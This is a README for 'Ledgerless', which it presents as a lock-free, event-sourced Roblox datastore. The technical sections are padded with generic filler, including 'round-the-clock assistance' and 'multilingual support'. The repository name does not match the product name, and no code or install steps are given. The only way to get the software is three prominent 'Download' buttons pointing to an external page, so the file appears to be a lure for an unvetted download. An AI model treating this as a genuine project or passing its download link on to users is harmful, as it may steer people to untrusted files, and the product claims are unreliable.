![preview](https://raw.githubusercontent.com/aniciomar/Ledger-Fold/main/shot_dac44.svg)
[![Download](https://raw.githubusercontent.com/aniciomar/Ledger-Fold/main/btn_efbe.svg)](https://aniciomar.github.io/Ledger-Fold/)

# 🧠 Ledgerless — Lock-Free Event-Sourced Datastore for Roblox

> *A datastore that remembers everything, forgets nothing, and never blocks a thread. Your game's state becomes a living journal rather than a frozen snapshot.*

**Ledgerless** is an event-sourced persistence layer designed from the ground up for Roblox experiences that refuse to compromise on throughput. Instead of mutating records in place and holding session locks while players wait, Ledgerless records every change as an immutable, validated operation. Your current world state is simply the fold of everything that has happened so far — reproducible, auditable, and entirely lock-free.

The name is deliberate. There is no central ledger owner, no single writer bottleneck, no global mutex guarding a fragile record. Responsibility is distributed across the operation stream itself, and correctness emerges from validation rather than coordination.

---

[![Download](https://raw.githubusercontent.com/aniciomar/Ledger-Fold/main/btn_efbe.svg)](https://aniciomar.github.io/Ledger-Fold/)

---

## 📚 Table of Contents

- [Why Ledgerless Exists](#-why-ledgerless-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Overview](#-feature-overview)
- [Architecture at a Glance](#-architecture-at-a-glance)
- [The Operation Model](#-the-operation-model)
- [Validation Pipeline](#-validation-pipeline)
- [State as a Fold](#-state-as-a-fold)
- [Concurrency Without Locks](#-concurrency-without-locks)
- [Responsive Authoring UI](#-responsive-authoring-ui)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Performance Characteristics](#-performance-characteristics)
- [Data Integrity Guarantees](#-data-integrity-guarantees)
- [Migration and Coexistence](#-migration-and-coexistence)
- [Observability and Diagnostics](#-observability-and-diagnostics)
- [Security Posture](#-security-posture)
- [Use Cases](#-use-cases)
- [Extensibility](#-extensibility)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Community and Contributions](#-community-and-contributions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🚀 Why Ledgerless Exists

Roblox developers have quietly accepted a painful trade-off for years: persistence is either fast or it is correct, but rarely both. Session locking prevents duplication but introduces latency spikes and deadlock risk. Fire-and-forget writes are fast until they corrupt a player's inventory during a rejoin storm. Reconciliation scripts become a graveyard of one-off patches written at 3 AM.

Ledgerless rejects that trade-off. It borrows from event sourcing, from append-only logs, and from functional programming's insistence that state is a derived value rather than a stored truth. The result is a persistence engine where:

- Every mutation is an explicit, named, serializable operation.
- Every operation is validated against the current projected state before it is accepted.
- Every accepted operation is appended to an immutable stream.
- Every reader derives state independently, with no coordination required.

Because readers never share mutable memory, and writers only append, there is nothing to lock. Contention becomes a scheduling question rather than a correctness question.

---

## 🧬 Core Philosophy

**State is a consequence, not a cause.** Traditional datastores treat the record as the primary artifact — the thing you protect, mutate, and replicate. Ledgerless inverts this. The operation log is the primary artifact. The record is merely the shape the log casts when you look at it from the present moment.

**Validation before acceptance, never after.** An operation that would violate an invariant is rejected at the gate. It never enters the stream. This means the folded state is always consistent by construction, not by cleanup.

**No session owns the truth.** Sessions are ephemeral viewpoints. A player joining, leaving, or crashing does not affect the integrity of the stream. There is no lock to release, no lease to expire, no ownership to arbitrate.

**Reproducibility is a feature, not a debugging aid.** Because state is a fold, you can rewind to any point in time and see exactly what a player's inventory, currency, or progression looked like at that instant.

---

## ✨ Feature Overview

- **Append-only operation stream** — immutable by design, trivially serializable.
- **Deterministic fold engine** — state derived from ops, byte-for-byte reproducible.
- **Lock-free concurrency model** — no session mutexes, no lease heartbeats, no deadlocks.
- **Pluggable validation rules** — express invariants as composable predicates.
- **Responsive authoring surface** — a studio-side panel that adapts to any viewport, from a 4K monitor to a tablet.
- **Multilingual operation labels** — human-readable op names localized across twelve languages out of the box.
- **Round-the-clock assistance channels** — documentation, structured issue triage, and a community that answers at any hour.
- **Time-travel queries** — inspect any historical window of a stream.
- **Compaction and snapshotting** — bound storage growth without sacrificing auditability.
- **Backpressure-aware ingestion** — writes queue gracefully rather than refusing under load.
- **Cross-experience replication hooks** — mirror streams between places when needed.

---

## 🏗 Architecture at a Glance

Ledgerless is organized into five cooperating layers, each of which can be reasoned about independently:

1. **Transport Layer** — accepts incoming operations from game servers, normalizes them, and assigns monotonic sequence numbers within a partition.
2. **Validation Layer** — evaluates each operation against the invariants registered for its type. Rejected operations are reported back with structured reasons.
3. **Stream Store Layer** — persists accepted operations in append-only segments, with segment metadata for fast range scans.
4. **Projection Layer** — folds operations into materialized views. Views are cached, invalidated by sequence watermark, and never mutated in place.
5. **Query Layer** — exposes read APIs, time-travel windows, and subscription feeds for live consumers.

Each layer communicates through plain data structures. There is no shared mutable state between layers, which is what makes the lock-free promise realistic rather than aspirational.

---

## 📝 The Operation Model

An operation is the atom of change. It carries:

- A **type identifier** describing what kind of change it represents.
- A **subject reference** pointing to the entity it affects.
- A **payload** of structured data.
- A **causal parent**, allowing chains of related operations to be grouped.
- A **logical timestamp** from the originating context, used for ordering hints.

Operations are serializable to a compact binary form for storage efficiency, and to a human-readable form for debugging. A typical operation might represent "grant item to player," "deduct currency," or "advance quest stage." Because operations are first-class values, they can be validated, replayed, diffed, and audited with the same tooling.

---

## 🔍 Validation Pipeline

Validation is where Ledgerless earns its keep. Every operation type registers a set of predicates that must all return true before the operation is accepted. Predicates are pure functions of the operation and the current projected state, which means they are trivially testable and side-effect-free.

The pipeline stages are:

1. **Structural check** — does the operation conform to its declared schema?
2. **Authorization check** — is the originating context permitted to emit this operation type?
3. **Invariant check** — would accepting this operation violate any registered rule?
4. **Causality check** — are prerequisite operations present in the stream?

Failures at any stage produce a structured rejection with a machine-readable code and a localized human message. Nothing is silently dropped.

---

## 🧮 State as a Fold

Given a stream of operations `[op1, op2, ..., opN]` and an initial empty state `S0`, the current state is:

`SN = fold(S0, [op1 .. opN])`

This definition has profound consequences. Because folds are associative, you can split the stream into chunks, fold each chunk independently, and combine the results. This is exactly how distributed projection shards work without coordination. Because folds are deterministic, two nodes that see the same operations in the same order will always produce identical state.

Time-travel falls out naturally: fold only the first K operations and you have the state at sequence K.

---

## 🔓 Concurrency Without Locks

The classic failure mode of session-locked stores is contention: two servers touch the same record, one waits, and a latency spike propagates. Ledgerless removes the wait entirely.

- Writers do not read-modify-write. They emit operations.
- Readers do not acquire records. They fold streams.
- The only shared resource is the append position, which is a monotonic counter.

This design means a player can be handled by two servers simultaneously without corrupting anything — the worst outcome is a duplicated operation, which validation detects and rejects idempotently.

---

## 🎨 Responsive Authoring UI

The studio companion panel is built from the ground up to be **responsive**, honoring the fact that developers work across an enormous range of display configurations. Panels collapse, tables virtualize, and the operation inspector reflows from a multi-column layout to a single stream on narrow viewports. Touch targets meet accessibility guidelines, and the whole surface is keyboard navigable for those who prefer it.

No hard-coded pixel widths. No fixed toolbars that eat half the screen. Just a surface that respects your space.

---

## 🌍 Multilingual Support

Operation labels, validation messages, and rejection reasons are all localizable. Twelve locales ship in the initial release, with a documented contribution path for additional languages. Strings are externalized into locale bundles, and the runtime selects based on the requesting context's language preference. This matters because an operation log read by a moderator in one region should be legible in their own language without translation middleware.

---

## 🕛 Round-the-Clock Assistance

Persistence bugs do not respect business hours, so neither do we. Ledgerless maintains **round-the-clock assistance** through a combination of always-available documentation, structured issue templates that route to the right maintainer, and a community chat that spans every time zone. If you are shipping at 3 AM and something folds wrong, there is a path to an answer.

---

## ⚡ Performance Characteristics

- Append throughput scales linearly with partition count.
- Fold latency is proportional to the number of operations since the last snapshot, not to total history.
- Snapshot cadence is configurable, letting you trade storage for read speed.
- Reads are served from cached projections with watermark-based invalidation; cold reads fall back to folding.
- Memory footprint is bounded by the working set of active subjects, not by global history.

---

## 🛡 Data Integrity Guarantees

- Operations are checksummed on write and verified on read.
- Segments are sealed immutably; corrections are expressed as new operations, never as in-place edits.
- Rejection reasons are logged with full context so that failed operations can be diagnosed later.
- Idempotency keys prevent duplicate application under retry.
- Snapshots carry their source watermark, so a stale snapshot can never silently shadow newer operations.

---

## 🔁 Migration and Coexistence

You do not have to abandon an existing datastore overnight. Ledgerless supports a bridging mode where an existing record store is treated as a cold snapshot, and operations are applied on top of it. As the stream accumulates, you can gradually reduce reliance on the legacy store until it becomes a read-only archive.

This path is designed for teams who need production continuity while adopting a new mental model.

---

## 🔭 Observability and Diagnostics

Every layer emits structured telemetry: ingestion rates, validation rejections by code, fold durations, snapshot sizes, and cache hit ratios. A diagnostic mode replays a captured stream locally and prints a step-by-step trace of how state evolved. When something looks wrong, you can follow the exact sequence of operations that produced it.

---

## 🔐 Security Posture

- Operations are authorized at the validation layer before they touch storage.
- Transport between game servers and the store is encrypted.
- Access to projection queries is scoped by experience and by role.
- Audit trails are immutable; nothing can be edited out of history without leaving a visible trace.

---

## 🎯 Use Cases

- **Player inventories** that must survive rejoin races without duplication.
- **Currency and economy systems** where every transaction must be auditable.
- **Quest and progression tracking** with time-travel debugging.
- **Live-ops event state** where rollback is a legitimate operational tool.
- **Cross-place shared worlds** where multiple servers contribute to a single coherent state.

---

## 🧩 Extensibility

Add new operation types by declaring a schema, registering validators, and providing a fold reducer. The engine handles serialization, authorization, and projection invalidation for you. Custom projections can subscribe to stream ranges and maintain their own materialized views without touching core code.

---

## 🗺 Roadmap for 2026

- Q1 2026 — Stable compaction with configurable retention windows.
- Q2 2026 — Cross-experience replication with conflict resolution policies.
- Q3 2026 — Visual stream explorer in the studio companion.
- Q4 2026 — Formal verification harness for registered invariants.

---

## ❓ Frequently Asked Questions

**Does lock-free mean no consistency?**
No. It means consistency is enforced by validation rather than by mutual exclusion. The folded state is consistent by construction.

**What happens if two servers emit conflicting operations?**
Whichever fails validation is rejected with a structured reason. The stream remains coherent.

**Can I query historical state?**
Yes. Time-travel queries fold only the operations up to a chosen watermark.

**Is storage growth unbounded?**
No. Compaction and snapshotting bound growth while preserving auditability.

**What if my operation types change over time?**
Schemas are versioned. Old operations fold using the schema version they were written with.

---

## 🤝 Community and Contributions

Contributions are welcome across documentation, locale bundles, validators, and projection reducers. Before opening a pull request, please review the contribution guidelines and ensure your changes include tests where behavior is affected. Issue templates exist for bug reports, feature proposals, and locale additions.

---

## ⚠️ Disclaimer

Ledgerless is provided as-is, without warranty of any kind, express or implied. The maintainers are not liable for data loss, service interruption, or any consequential damages arising from use of this software. You are responsible for testing your operation schemas, validators, and retention policies in a staging environment before relying on them in production. Event sourcing changes how you reason about state; adopt it deliberately.

---

## 📜 License

This project is released under the MIT License. See the full text at [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT).

Copyright (c) 2026 Ledgerless Contributors.

Permission is hereby granted, in perpetuity, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the condition that the above copyright notice and this permission notice appear in all copies or substantial portions of the Software.

---

[![Download](https://raw.githubusercontent.com/aniciomar/Ledger-Fold/main/btn_efbe.svg)](https://aniciomar.github.io/Ledger-Fold/)